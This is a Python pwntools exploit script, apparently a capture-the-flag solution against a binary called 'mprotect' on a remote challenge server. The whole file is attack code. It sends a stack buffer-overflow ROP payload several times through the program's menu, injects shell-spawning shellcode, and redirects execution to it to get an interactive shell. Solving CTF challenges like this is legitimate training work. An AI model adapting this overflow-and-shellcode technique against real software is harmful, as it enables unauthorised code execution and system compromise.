from pwn import *
p= process("./mprotect")
p=remote("pwn.sh4dy.com",5004)
elf = context.binary=ELF("./mprotect")

sh = asm(shellcraft.sh())
offset = 48
incC = 0x401379
ret=0x000000000040101a
main = 0x000000000401558
payload1 = flat(b'a'*offset,ret,incC,main)
print(len(payload1))
print(sh)
p.recvuntil(b"choice\n")
p.sendline(b'1')

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)
p.recvline()

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)
p.recvline()

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)

p.recvuntil(b"choice\n")
p.sendline(b'2')
p.recvline()
p.sendline(payload1)

p.recvuntil(b"choice\n")
p.sendline(b'3')

p.recvuntil(b"choice\n")
p.sendline(b'1')
p.recvline()
p.recvline()
# gdb.attach(p,"init-gef")
p.sendline(sh)

p.recvuntil(b"choice\n")
p.sendline(b'2')
payload=flat(b'a'*56,0x500000)
p.sendline(payload)
p.interactive()

p.interactive()
